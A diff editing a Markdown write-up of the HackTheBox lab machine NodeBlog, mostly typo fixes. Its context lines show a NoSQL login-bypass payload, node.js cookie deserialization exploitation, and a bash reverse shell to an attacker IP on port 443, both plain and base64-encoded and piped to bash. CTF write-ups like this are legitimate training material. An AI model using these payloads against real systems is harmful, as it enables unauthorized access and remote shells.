@@ -6,8 +6,7 @@ tags: ['hackthebox', 'writeup', 'nosqlinyection']
 ---
 
 ## Introduction
-Hello everyone! Today we are going to be pwning a HTB machine called NodeBlog. This is an easy machine, but we are going to be covering a few fundamental attacks like xxe-injection or nosql-injection as asuch as deserialization (in node.js). Have fun reading!
-hi
+Hello everyone! Today we are going to be pwning a HTB machine called NodeBlog. This is an easy machine, we are going to be covering a few fundamental attacks like xxe-injection or nosql-injection as asuch as deserialization (in node.js). Have fun reading!
 
 
 ## Ports recognizement
@@ -39,7 +38,7 @@ but won't work.
 We have to test also nosql inyection. [PayloadAllTheThings][attp] have some exploit to bypass login form.
 We are going to use burpsuite to intercept the response and modify the fields on the forms.
 
-If we input random logins we hace the response Invalid Username, but if we set in the username field admin and in the password random text we get Invalid Password, so we have a method to get users.
+If we input random logins we have the response Invalid Username, but if we set in the username field admin and in the password random text we get Invalid Password, so we have a method to get users.
 Now we can try bypass the password with nosqli.
 ```bash
 {"user": "admin", "password": {"$ne": null}}
@@ -47,6 +46,7 @@ Now we can try bypass the password with nosqli.
 Also we can make a script to dump all posible usernames ans their relative passwords [nosqlforce.py][nsqlf]
 
 > WE ARE INSIDE :boom:
+<br>
 
 We see an upload button. We try to upload a random file and we get this response:
 
@@ -151,7 +151,7 @@ We can see that the server is using an unserialize function without sanitaze inp
 
 Usually the unserialize input is the cookie, because this and It's called c the code is probably deserializing the cookie.
 
-The problem about the insecure deserilization is that if you use IIFE you can execute code when the function is deserializting even before the string is interpreted. So we can send the payload into the cookie, when the server desirialize the string, this will be executed even the cookie doen't have any sense.
+The problem about the insecure deserilization is that if you use IIFE you can execute code when the function is deserializating even before the string is interpreted. So we can send the payload into the cookie, when the server desirialize the string, this will be executed even the cookie doen't have any sense.
 This [post][deserialize_post] explain it pretty well.
 The payload is the next:
 
@@ -167,7 +167,7 @@ In order to pass this code into the url we have to convert it in base64
 ```bash
 echo 'bash -i >& /dev/tcp/{your_tun0_ip}/443 0>&1' | base64
 ```
-In the victim's machine we have to reverse the base64 format, so our final revershe shell payload is:
+In the victim's machine we have to reverse the base64 format, so our final reverse shell payload is:
 ```bash
 echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi41LzQ0MyAwPiYxCg==|base64 -d|bash
 ```
